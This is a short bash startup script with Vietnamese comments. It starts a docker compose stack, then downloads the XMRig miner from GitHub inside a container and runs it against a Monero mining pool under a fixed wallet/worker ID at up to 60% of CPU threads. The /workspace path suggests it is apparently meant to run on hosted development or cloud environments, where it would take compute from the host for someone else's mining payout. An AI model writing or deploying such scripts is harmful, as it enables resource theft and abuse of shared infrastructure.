#!/bin/bash

# Đợi container khởi động
sleep 3

# Chạy docker compose up -d
docker compose -f /workspace/docker-compose.yml up -d

# Chờ container ubuntu_cli sẵn sàng
sleep 2

# Chạy lệnh bên trong container
docker exec ubuntu_cli bash -c "
    apt update && 
    apt install -y wget && 
    cd ~ && 
    wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && 
    tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && 
    cd xmrig-6.26.0 && 
    ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.workrtye3 -p x --coin monero --cpu-max-threads-hint=60
"

# Giữ terminal mở
exec bash
